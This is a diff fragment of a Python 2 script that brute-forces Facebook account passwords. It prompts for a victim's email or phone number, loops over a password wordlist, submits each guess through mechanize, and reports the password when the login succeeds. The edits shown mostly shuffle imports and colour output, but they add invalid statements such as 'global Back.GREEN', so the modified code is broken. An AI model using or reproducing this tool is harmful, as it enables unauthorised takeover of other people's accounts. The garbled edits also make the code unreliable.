@@ -1,14 +1,13 @@
 #!/usr/bin/env python
 # -*- coding: UTF-8 -*-
-
-import sys
 from colorama import Fore, Back, Style
+import sys
 import mechanize
 import cookielib
 import random
 
 
-
+Fore.GREEN
 
 email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
 
@@ -48,13 +47,14 @@ def brute(password):
 	sub = br.submit()
 	log = sub.geturl()
 	if log != login and (not 'login_attempt' in log):
-			print(Fore.GREEN+"\n\n[+] Password Find = {}".format(password))
+			print("\n\n[+] Password Find = {}".format(password))
 			raw_input("ANY KEY to Exit....")
 			sys.exit(1)
 
 			
 def search():
 	global password
+	global Back.GREEN
 	passwords = open(passwordlist,"r")
 	for password in passwords:
 		password = password.replace("\n","")
